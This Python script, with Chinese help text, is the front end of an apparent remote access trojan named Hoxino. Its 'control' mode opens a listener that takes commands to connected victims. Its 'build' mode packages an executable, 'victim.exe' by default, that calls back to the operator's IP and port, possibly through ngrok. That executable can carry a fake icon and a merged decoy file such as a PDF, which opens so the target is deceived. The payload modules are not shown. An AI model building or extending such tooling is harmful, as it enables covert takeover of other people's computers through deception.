import argparse
from textwrap import dedent
from module import port_listener
from module import builder
from module import anim
import sys

# 设置stdout的编码为UTF-8，确保中文正确显示
if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        # Python 3.6及以下没有reconfigure方法
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer)

anim.anim()

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, 
                               epilog=dedent("使用示例:\n\npython Hoxino.py control -h\npython Hoxino.py build -h\npython Hoxino.py update"), 
                               description=dedent("可用模式:\n\ncontrol: 控制客户端\nbuild: 构建可执行文件\nupdate: 检查更新"))
subparsers = parser.add_subparsers(dest="subparser")

server_parser = subparsers.add_parser("control", formatter_class=argparse.RawDescriptionHelpFormatter, 
                                    epilog=dedent("使用示例:\n\npython Hoxino.py control -ip <控制服务器IP> -p <控制服务器端口>\npython Hoxino.py control -ip localhost -p 4444"), 
                                    description=dedent("控制客户端。输入控制服务器IP和端口。等待客户端连接，然后执行对目标的命令。"))
server_parser.add_argument("-ip", "--ip_address", required=True, help="输入控制模式的IP地址")
server_parser.add_argument("-p", "--port", required=True, help="输入控制模式的端口")

build_parser = subparsers.add_parser("build", formatter_class=argparse.RawDescriptionHelpFormatter, 
                                   epilog=dedent("使用示例:\n\npython Hoxino.py build -ip <控制服务器IP> -p <控制服务器端口> -i <图标文件(可选)> -m <合并文件(可选)> -n <可执行文件名(可选)>\npython Hoxino.py build -ip localhost -p 4444 -i my_icon.ico -m merge.pdf -n executable.exe"), 
                                   description=dedent("使用给定参数构建可执行文件。IP和端口应该是您的控制服务器IP和端口(您可以使用ngrok等端口转发服务)。图标文件是可选的，您可以使用-i参数为可执行文件添加图标。合并文件是可选的，您可以使用-m参数将文件合并到可执行文件中。当在目标上打开可执行文件时，合并文件也会打开。您可以使用-n参数更改可执行文件名称。默认为victim.exe或victim。"))
build_parser.add_argument("-i", "--icon_file", required=False, help="输入可执行文件的图标文件(可选)")
build_parser.add_argument("-m", "--merge_file", required=False, help="输入可执行文件的合并文件。当可执行文件打开时，合并文件也会打开(可选)")
build_parser.add_argument("-ip", "--ip_address", required=True, help="输入IP地址。这应该是您的IP地址。目标将连接到此IP")
build_parser.add_argument("-p", "--port", required=True, help="输入端口。这应该是您的端口。目标将连接到此端口")
build_parser.add_argument("-n", "--name", required=False, help="输入可执行文件名称(可选)")

args = parser.parse_args()

if args.subparser == "control":
    try:
        port_listener.listen_port(args.ip_address, int(args.port))
    except ValueError:
        print("[-]请输入有效的端口或IP。")
    except Exception as e:
        print(f"[-]启动控制服务器时出错: {str(e)}")
elif args.subparser == "build":
    try:
        builder.build(args.ip_address, args.port, args.icon_file, args.merge_file, args.name)
    except Exception as e:
        print(f"[-]构建可执行文件时出错: {str(e)}")
else:
    parser.print_help()

